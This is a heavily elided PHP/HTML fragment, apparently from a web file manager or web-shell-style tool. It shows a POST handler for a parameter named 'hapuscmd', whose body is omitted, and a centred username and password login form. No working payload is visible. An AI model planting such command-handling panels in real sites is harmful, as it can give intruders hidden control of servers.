...
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['hapuscmd'])) {
...
<div style="height:auto; min-height:100%;">
  <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">
    ...
    <form method="post">
      <div>
        <input type="text" id="fm_usr" name="fm_usr" autocomplete="off">
      </div>
      <div>
        <input type="password" id="fm_pwd" name="fm_pwd" autocomplete="off">
      </div>
